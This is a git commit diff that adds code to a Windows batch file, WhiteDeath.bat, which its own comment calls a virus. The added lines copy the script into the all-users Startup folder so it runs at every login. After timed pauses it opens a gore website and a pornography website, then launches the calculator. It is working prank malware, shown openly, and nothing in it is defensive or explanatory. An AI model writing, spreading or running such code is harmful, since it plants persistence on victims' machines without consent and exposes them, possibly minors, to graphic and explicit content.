1fe21761d5dde48379539fd6b01a033aef96b3dc
Last-Ai <132348071+Last-Ai@users.noreply.github.com>
2023-05-31 08:05:50 +1000

    Update WhiteDeath.bat

--- WhiteDeath.bat
+++ WhiteDeath.bat
@@ -1,1 +1,17 @@
 @echo off
+
+rem Copys Virus To Startup On Open
+copy "WhiteDeath.bat" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+
+timeout /t 8 > nul
+
+start "http://www.bestgore.fun"
+
+timeout /t 9 > nul
+
+start "http://www.pornhub.com"
+
+timeout /t 11 > nul
+
+start calc.exe
+
